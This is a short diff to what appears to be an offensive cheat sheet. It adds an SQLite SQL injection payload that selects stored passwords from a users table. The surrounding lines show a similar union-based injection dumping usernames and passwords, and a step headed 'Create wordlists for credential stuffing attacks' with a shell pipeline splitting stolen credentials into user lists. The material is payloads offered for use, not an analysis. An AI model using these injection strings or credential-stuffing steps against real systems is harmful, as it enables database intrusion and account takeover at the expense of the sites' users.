@@ -49,6 +49,10 @@ SQLite
 
     ' union select 1,2,3,4,5,group_concat(username," | ",password) From users.User #
 
+SQLite
+
+    ' UNION SELECT passwd FROM users-- -
+
 ### 8) Create wordlists for credential stuffing attacks
 
     cat creds | tr "," "\n" | cut -d " " -f 1 > user
